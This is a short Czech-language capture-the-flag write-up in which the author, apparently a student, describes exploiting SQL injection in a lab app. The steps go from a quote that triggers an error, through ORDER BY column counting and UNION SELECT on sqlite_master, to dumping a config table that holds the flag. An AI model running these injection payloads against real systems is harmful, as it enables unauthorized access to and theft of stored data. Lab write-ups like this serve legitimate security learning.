prvně jsem tam napsal ', což mi hodilo chybu :D
to znamenalo, že to není nijak chráněný
když jsem to zjistil, tak jsem použil ' ORDER BY 1 -- což by mi mělo ukázat první sloupec, začíná to ' protože to ukončí to první ' a končí to -- aby se zbytek kódu považoval za komentář, a nefungoval.
to mi ukázalo:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
zkusil jsem ' ORDER BY 2 -- (jestli tam je více sloupců)
to mi vypsalo to samé
pak jsem zkusil ' ORDER BY 3 --
což mi dalo SQL Chyba: 1st ORDER BY term out of range - should be between 1 and 2
po tom jsem teda zjistil že tam jsou 2 sloupce
tak jsem dal ' UNION SELECT 1,2 -- (ab
a to mi vypsalo:
Uživatel: 1 | Pozice: 2
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
pak jsem napsal:
' UNION SELECT name, sql FROM sqlite_master -- 
to mi napsalo:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
Uživatel: config | Pozice: CREATE TABLE config (key TEXT, value TEXT)
Uživatel: users | Pozice: CREATE TABLE users (id INTEGER, name TEXT, role TEXT)
takže jsem zjistil, že tabulky jsou config, a users
po tom jsem tam vložil ' UNION SELECT key, value FROM config -- aby mi to ukázalo co je ve sloupci key, z tabulky config
napsalo to:
Uživatel: Administrator | Pozice: Boss
Uživatel: Jan Novák | Pozice: Student
Uživatel: Petr Svoboda | Pozice: Učitel
Uživatel: admin_email | Pozice: admin@skola.cz
Uživatel: flag | Pozice: FLAG{Sql_Un1on_M4st3r_S0SE}  <---- TADY JSEM ZÍSKAL TU VLAJKU :)
